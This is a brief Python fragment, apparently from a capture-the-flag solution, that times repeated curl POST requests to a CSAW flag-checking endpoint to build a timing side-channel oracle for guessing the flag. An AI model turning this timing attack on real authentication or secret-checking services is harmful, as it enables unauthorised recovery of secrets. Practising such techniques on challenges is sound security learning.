B="http://flagchecker.chal.csaw.io:5000/check"
def t(f, reps=5):
    xs=[]
    for _ in range(reps):
        out = subprocess.run(["curl","-s","-o","/dev/null","-w","%{time_total}","--max-time","8","-A","curl/7.81","-X","POST","-F",f"flag={f}",B], capture_output=True, text=True).stdout
        xs.append(float(out))
    return statistics.mean(xs)
